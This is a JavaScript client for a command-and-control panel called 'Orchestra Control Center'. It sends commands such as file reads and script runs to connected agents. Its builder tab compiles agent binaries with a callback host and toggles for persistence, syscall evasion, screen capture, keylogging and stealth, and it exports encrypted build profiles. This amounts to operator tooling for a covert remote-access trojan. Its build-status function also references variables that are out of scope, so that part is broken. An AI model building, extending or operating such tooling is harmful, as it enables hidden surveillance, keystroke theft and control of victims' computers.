// Orchestra Control Center — minimal dashboard client.
// Stores the bearer token in sessionStorage (cleared when the tab closes).

(() => {
  const $ = (id) => document.getElementById(id);
  let token = sessionStorage.getItem("oc_token") || "";
  let ws = null;

  const headers = () => ({
    "Authorization": "Bearer " + token,
    "Content-Type": "application/json",
  });

  async function api(path, opts = {}) {
    const res = await fetch("/api" + path, {
      ...opts,
      headers: { ...headers(), ...(opts.headers || {}) },
    });
    if (res.status === 401) throw new Error("unauthorized");
    return res;
  }

  async function login() {
    const t = $("token").value.trim();
    if (!t) return;
    token = t;
    try {
      const res = await fetch("/api/agents", { headers: { "Authorization": "Bearer " + t } });
      if (res.status === 401) {
        $("login-err").textContent = "Invalid token.";
        return;
      }
      sessionStorage.setItem("oc_token", t);
      $("login").hidden = true;
      $("main-content").hidden = false;
      await refreshAgents();
      openWs();
    } catch (e) {
      $("login-err").textContent = "Connection failed: " + e.message;
    }
  }

  function fmtTime(epoch) {
    if (!epoch) return "—";
    const ago = Math.max(0, Math.floor(Date.now() / 1000) - epoch);
    if (ago < 60) return ago + "s ago";
    if (ago < 3600) return Math.floor(ago / 60) + "m ago";
    return new Date(epoch * 1000).toISOString();
  }

  function renderAgents(agents) {
    $("agent-count").textContent = "(" + agents.length + ")";
    const tbody = $("agents-tbody");
    const sel = $("agent-select");
    const prevSel = sel.value;
    if (!agents.length) {
      tbody.innerHTML = '<tr><td colspan="4" class="muted">No agents connected.</td></tr>';
      sel.innerHTML = "";
      return;
    }
    tbody.innerHTML = agents.map(a =>
      `<tr><td><code>${escapeHtml(a.agent_id)}</code></td>` +
      `<td>${escapeHtml(a.hostname)}</td>` +
      `<td>${escapeHtml(a.peer)}</td>` +
      `<td>${fmtTime(a.last_seen)}</td></tr>`
    ).join("");
    sel.innerHTML = agents.map(a => `<option value="${escapeAttr(a.agent_id)}">${escapeHtml(a.agent_id)}</option>`).join("");
    if (agents.find(a => a.agent_id === prevSel)) sel.value = prevSel;
  }

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"}[c]));
  }
  function escapeAttr(s) { return escapeHtml(s); }

  async function refreshAgents() {
    try {
      const res = await api("/agents");
      const agents = await res.json();
      renderAgents(agents);
    } catch (e) {
      console.warn(e);
    }
  }

  function buildCommand() {
    const kind = $("cmd-select").value;
    const arg = $("cmd-arg").value;
    switch (kind) {
      case "Ping": return "Ping";
      case "GetSystemInfo": return "GetSystemInfo";
      case "ListProcesses": return "ListProcesses";
      case "ListDirectory": return { ListDirectory: { path: arg } };
      case "ReadFile": return { ReadFile: { path: arg } };
      case "RunApprovedScript": return { RunApprovedScript: { script: arg } };
      default: return "Ping";
    }
  }

  async function sendCommand() {
    const id = $("agent-select").value;
    if (!id) { alert("No agent selected."); return; }
    const command = buildCommand();
    $("result").textContent = "Sending…";
    $("result").className = "muted";
    try {
      const res = await api("/agents/" + encodeURIComponent(id) + "/command", {
        method: "POST",
        body: JSON.stringify({ command }),
      });
      const body = await res.json();
      const cls = body.outcome === "ok" ? "ok" : "err";
      $("result").className = cls;
      $("result").textContent = JSON.stringify(body, null, 2);
    } catch (e) {
      $("result").className = "err";
      $("result").textContent = "Request failed: " + e.message;
    }
  }

  function openWs() {
    const proto = location.protocol === "https:" ? "wss:" : "ws:";
    // Browsers don't allow custom headers on WebSocket, so we pass the token
    // via the Sec-WebSocket-Protocol handshake header. The server's ws_handler
    // (orchestra-server/src/api.rs) extracts the value beginning with
    // "bearer." and validates it in constant time before completing the
    // upgrade; an unknown or missing token causes a 401 response.
    try {
      ws = new WebSocket(proto + "//" + location.host + "/api/ws", ["bearer." + token]);
      ws.onmessage = (ev) => {
        try {
          const m = JSON.parse(ev.data);
          if (m.kind === "agents") renderAgents(m.agents);
          if (m.kind === "audit") appendAudit(m.event);
        } catch {}
      };
      ws.onclose = () => setTimeout(openWs, 5000);
    } catch (e) {
      console.warn("ws open failed", e);
    }
    setInterval(refreshAgents, 5000);
  }

  function appendAudit(ev) {
    const line = `[${new Date(ev.timestamp * 1000).toISOString()}] ${ev.user} ${ev.action} -> ${ev.agent_id} (${ev.outcome === "Success" ? "ok" : "fail"}) ${ev.details}`;
    const el = $("audit");
    el.textContent = (line + "\n" + el.textContent).split("\n").slice(0, 200).join("\n");
  }

  $("login-btn").addEventListener("click", login);
  $("send-btn").addEventListener("click", sendCommand);
  $("token").addEventListener("keydown", e => { if (e.key === "Enter") login(); });

  const tabDash = $("tab-dash");
  const tabBuilder = $("tab-builder");
  const btnDash = $("tab-btn-dash");
  const btnBuilder = $("tab-btn-builder");

  btnDash.addEventListener("click", () => {
    tabDash.hidden = false;
    tabBuilder.hidden = true;
    btnDash.style.fontWeight = "bold";
    btnDash.className = "tab-btn active";
    btnBuilder.style.fontWeight = "normal";
    btnBuilder.className = "tab-btn";
  });

  btnBuilder.addEventListener("click", () => {
    tabDash.hidden = true;
    tabBuilder.hidden = false;
    btnDash.style.fontWeight = "normal";
    btnDash.className = "tab-btn";
    btnBuilder.style.fontWeight = "bold";
    btnBuilder.className = "tab-btn active";
  });

  $("btn-gen-key").addEventListener("click", () => {
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    $("build-key").value = Array.from(bytes).map(b => b.toString(16).padStart(2, "0")).join("");
  });

  async function submitBuild() {
    const os = $("build-os").value;
    const arch = $("build-arch").value;
    const host = $("build-host").value.trim();
    const port = parseInt($("build-port").value, 10);
    const pin = $("build-pin").value.trim();
    const key = $("build-key").value.trim();
    const outDir = $("build-output-dir").value.trim();

    if (!host || !port || !pin || !key) {
      alert("Please fill in all connection details and encryption key.");
      return;
    }

    const req = {
      os, arch, 
      features: {
        persistence: $("feat-persistence").checked,
        syscalls: $("feat-syscalls").checked,
        screencap: $("feat-screencap").checked,
        keylog: $("feat-keylog").checked,
        stealth: $("feat-stealth").checked,
      },
      host, port, pin, key,
      output_dir: outDir ? outDir : null
    };

    $("build-download").hidden = true;
    $("btn-build").disabled = true;
    const logEl = $("build-log");
    logEl.textContent = "Starting build...\n";
    logEl.className = "";

    try {
      const res = await fetch("/api/build", {
        method: "POST",
        headers: headers(),
        body: JSON.stringify(req)
      });
      
      const resData = await res.json();
      
      if (!res.ok) {
        logEl.textContent += "Error: " + (resData.error || res.statusText);
        logEl.className = "err";
      } else {
        logEl.textContent += "Build complete.\nJob ID: " + resData.job_id + "\n";
        logEl.textContent += resData.log || "";
        window.checkBuildStatus(resData.job_id);
      }
    } catch (e) {
      logEl.textContent += "\nRequest failed: " + e.message;
      logEl.className = "err";
    } finally {
      $("btn-build").disabled = false;
    }
  }

  $("btn-build").addEventListener("click", submitBuild);

  if (token) {
    $("token").value = token;
    login();
  }

  // Profile Encryption / Decryption using WebCrypto AES-GCM
  async function getCryptoKey(passphrase, salt) {
    const enc = new TextEncoder();
    const keyMaterial = await window.crypto.subtle.importKey(
      "raw", enc.encode(passphrase), { name: "PBKDF2" }, false, ["deriveBits", "deriveKey"]
    );
    return window.crypto.subtle.deriveKey(
      { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
      keyMaterial,
      { name: "AES-GCM", length: 256 },
      true, ["encrypt", "decrypt"]
    );
  }

  function uint8ArrayToBase64(bytes) {
    let binary = "";
    for (let i = 0; i < bytes.byteLength; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return window.btoa(binary);
  }

  function base64ToUint8Array(base64) {
    const binaryStr = window.atob(base64);
    const bytes = new Uint8Array(binaryStr.length);
    for (let i = 0; i < binaryStr.length; i++) {
        bytes[i] = binaryStr.charCodeAt(i);
    }
    return bytes;
  }

  $("btn-export-profile").addEventListener("click", async () => {
    const passphrase = $("profile-passphrase").value;
    if (!passphrase) { alert("Please provide a passphrase to encrypt the profile."); return; }

    const profileData = {
      os: $("build-os").value,
      arch: $("build-arch").value,
      features: {
        persistence: $("feat-persistence").checked,
        syscalls: $("feat-syscalls").checked,
        screencap: $("feat-screencap").checked,
        keylog: $("feat-keylog").checked,
        stealth: $("feat-stealth").checked,
      },
      host: $("build-host").value.trim(),
      port: parseInt($("build-port").value, 10) || 443,
      pin: $("build-pin").value.trim(),
      key: $("build-key").value.trim(),
      output_dir: $("build-output-dir").value.trim() || undefined,
    };

    try {
      const salt = window.crypto.getRandomValues(new Uint8Array(16));
      const iv = window.crypto.getRandomValues(new Uint8Array(12));
      const key = await getCryptoKey(passphrase, salt);
      const encodedData = new TextEncoder().encode(JSON.stringify(profileData));
      const ciphertext = await window.crypto.subtle.encrypt(
        { name: "AES-GCM", iv: iv }, key, encodedData
      );

      const payload = {
        salt: uint8ArrayToBase64(salt),
        iv: uint8ArrayToBase64(iv),
        ciphertext: uint8ArrayToBase64(new Uint8Array(ciphertext))
      };

      const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "orchestra_profile.enc.json";
      a.click();
    } catch (e) {
      alert("Encryption failed: " + e.message);
    }
  });

  $("btn-import-profile").addEventListener("click", async () => {
    const fileFile = $("profile-file").files[0];
    if (!fileFile) { alert("Please select a profile file."); return; }
    
    const passphrase = $("profile-passphrase").value;
    // We allow plaintext profiles if no passphrase and it's raw JSON
    
    try {
      const text = await fileFile.text();
      let data = JSON.parse(text);
      if (data.ciphertext) {
         if (!passphrase) { alert("This profile is encrypted. Provide a passphrase."); return; }
         const salt = base64ToUint8Array(data.salt);
         const iv = base64ToUint8Array(data.iv);
         const ciphertext = base64ToUint8Array(data.ciphertext);
         const cryptoKey = await getCryptoKey(passphrase, salt);
         
         const decrypted = await window.crypto.subtle.decrypt(
           { name: "AES-GCM", iv: iv }, cryptoKey, ciphertext
         );
         data = JSON.parse(new TextDecoder().decode(decrypted));
      }
      
      if (data.os) $("build-os").value = data.os;
      if (data.arch) $("build-arch").value = data.arch;
      if (data.features) {
        $("feat-persistence").checked = !!data.features.persistence;
        $("feat-syscalls").checked = !!data.features.syscalls;
        $("feat-screencap").checked = !!data.features.screencap;
        $("feat-keylog").checked = !!data.features.keylog;
        $("feat-stealth").checked = !!data.features.stealth;
      }
      if (data.host) $("build-host").value = data.host;
      if (data.port) $("build-port").value = data.port;
      if (data.pin) $("build-pin").value = data.pin;
      if (data.key) $("build-key").value = data.key;
      if (data.output_dir !== undefined) $("build-output-dir").value = data.output_dir;
      
      alert("Profile loaded successfully.");
    } catch (e) {
      alert("Decryption or loading failed: " + e.message);
    }
  });
})();

window.checkBuildStatus = async function(job_id) {
    const logEl = document.getElementById("build-log");
    try {
        const res = await fetch("/api/build/status/" + job_id, { headers: { ...headers() }});
        if (!res.ok) {
            logEl.textContent += "\nError fetching status: " + res.statusText;
            document.getElementById("btn-build").disabled = false;
            return;
        }
        const data = await res.json();
        const currentLog = data.log || "";
        if (currentLog) {
            logEl.textContent = "Job ID: " + job_id + "\n" + currentLog;
        }
        
        if (data.status === "Queued" || data.status === "Running") {
            setTimeout(() => window.checkBuildStatus(job_id), 2000);
        } else {
            document.getElementById("btn-build").disabled = false;
            if (data.status === "Completed") {
                logEl.className = "ok";
                const dload = document.getElementById("build-download");
                dload.hidden = false;
                document.getElementById("build-download-link").href = "/api/build/" + job_id + "/download?token=" + encodeURIComponent(token);
            } else {
                logEl.className = "err";
            }
        }
    } catch (e) {
        logEl.textContent += "\nStatus check failed: " + e.message;
        document.getElementById("btn-build").disabled = false;
    }
};

